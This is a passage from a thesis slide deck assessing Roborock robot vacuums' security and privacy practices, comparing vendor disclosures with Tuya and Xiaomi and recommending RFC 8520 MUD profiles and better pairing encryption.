✔️ Application-level encryption  
✔️ Reduction in log verbosity (though not consistent)  
✔️ `ip{,6}tables` rules  
✔️ Tightening of access through `adb`, `ssh`, `serial`  
✔️ They seem to respond to security incidents  
✔️ (some) effort to uphold privacy and define data usage

---

⚠️ They seem to respond to security incidents. <label><i style="font-style: italic">sort of</i></label>

>

## Disclosures

* Only <label>one</label> vulnerability disclosure listed on their [webpage](https://global.roborock.com/pages/disclosure-security-vulnerability-on-tuya-iot-cloud)
  * _8 years of business, 15 products, 1 vulnerability?_
  * No CVE / other detail report
* Perhaps more, but undisclosed

{{% center %}}<img round src="/uploads/Snipaste_2022-07-28_08-49-02.jpg" width="50%">{{% /center %}}

---

## What about other companies?

<span style="display: inline-table; vertical-align: middle;"><img src="/uploads/tuya_logo.png" height="40px" alt="Tuya" ></span> <span style="color: grey; font-size: 0.6em">(IoT Ecosystem, Whitelabel Vendor)</span> and  <span style="display: inline-table; vertical-align: middle;"><img src="/uploads/xiaomi_smartlife_logo.webp" height="40px" alt="Mijia (Xiaomi)" ></span> Xiaomi <span style="color: grey; font-size: 0.6em">(IoT Ecosystem)</span> have published CVEs

* Reminder; not a necessity
* They both have large security teams and bug bounty programs
  * Bigger company
  * More at stake

<br />

{{% center %}}<img round src="/uploads/Snipaste_2022-07-28_09-01-52.jpg" width="70%">{{% /center %}}

---

<div style="display: flex; flex-direction: row">

<div>
<div style="text-align: center"><a href="https://featherbear.cc/UNSW-CSE-Thesis/posts/tuya-white-paper/"><img round src="/uploads/Snipaste_2022-07-28_09-06-38.jpg" width="50%"></a></div>

</div>

<div>
<div style="text-align: center"><a href="https://featherbear.cc/UNSW-CSE-Thesis/posts/xiaomi-cyber-security-baseline-for-consumer-internet-of-things/"><img round src="/uploads/Snipaste_2022-07-28_09-07-28.jpg" width="50%"></a></div>

</div>
</div>

Both companies have white-papers / publications about security minimums.

<small><b>Note</b><br/>The Tuya paper mentions encryption during the pairing process.<br/>The Roborock S6 (which integrates the Tuya platform), <label>fails to do so</label>.<br/><br/>Is there a compliance check / verification between either party?</small>

{{% /section %}}

---

# Towards an expected conversation - RFC 8520

> [RFC 8520](https://datatracker.ietf.org/doc/rfc8520/) - Manufacturer Usage Description

{{% section %}}

<img round src="/uploads/20220725-snipaste_2022-07-26_07-37-41.jpg" />


[MUD](https://developer.cisco.com/docs/mud/#!what-is-mud/what-is-mud) files whitelist the nature of network traffic that a device should transmit/receive. <span style="font-size: 0.8em; color: grey">(e.g. Transmit IPv4 tcp/8890 to (DNS) example.com)</span>

Traffic that does not match the MUD are discarded (or allowed but flagged). Mitigates unexpected ports/hosts - but ineffective against <span style="font-size: 0.6em">(e.g.)</span> C2 payloads

IoT Research Team @ [UNSW EE&T](https://iotanalytics.unsw.edu.au/mudprofiles) has done some research

---

<div style='display: flex; flex-direction: row'>

<div>
<img round src="/uploads/20220725-snipaste_2022-07-26_07-26-49.jpg" >
</div>

<div>
RFC8520 was approved and published in <label>March 2019</label>

<br/>
<br/>

But is anyone adopting it?

</div>

{{% /section %}}

---

>

<div>
How have manufacturers of IoT / smart home devices addressed the increasing concerns of digital privacy and product security?
<div style="text-align: right; font-size: 20px;">(Specifically Roborock)</span>
</div>

> 

✔️ Data is cleared during resets  
✔️ Lockdown on access methods (ADB, Serial, MiIO, SSH, IPv6)  
✔️ Data is encrypted during transit  

<label>but more can be done</label>

🔥 Further transparency in disclosures  
🔥 Improved privacy policy  
🔥 Pairing encryption  
🔥 Data should be cleared on device disassociation  
🔥 Better co-ordination between ecosystems and vendors  
🔥 MUD files - both devices and infrastructure  
🔥 Whitepapers, bug bounties  

{{% note %}}
Least access - root, lockdown - though /dev/shm requires administrative access etc ..
Then again it's an embedded device

{{% /note %}}
---

# Future Work

* Test the mobile app
* Test the cloud infrastructure
* Test MITM - HSTS?
* Make MUD profile
* Fuzz exposed ports
  * e.g. `rr_loader` service

---

# Aside: Thesis in a Year

[![](/uploads/screely-1658645824986.png)](https://featherbear.cc/UNSW-CSE-Thesis/tldr/)


---
# Thank You

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />


<hr >

Andrew Wong

<sub>
<p>w: <a href="https://featherbear.cc/UNSW-CSE-Thesis">featherbear.cc/UNSW-CSE-Thesis</a></p>
<p>e: <script>document.write(atob('YW5kcmV3Lmoud29uZ0BzdHVkZW50LnVuc3cuZWR1LmF1'))</script></p>
</sub>

<!-- 
https://elinux.org/images/f/f8/Common-Attacks-on-IoT-Devices-Christina-Quast.pdf
 -->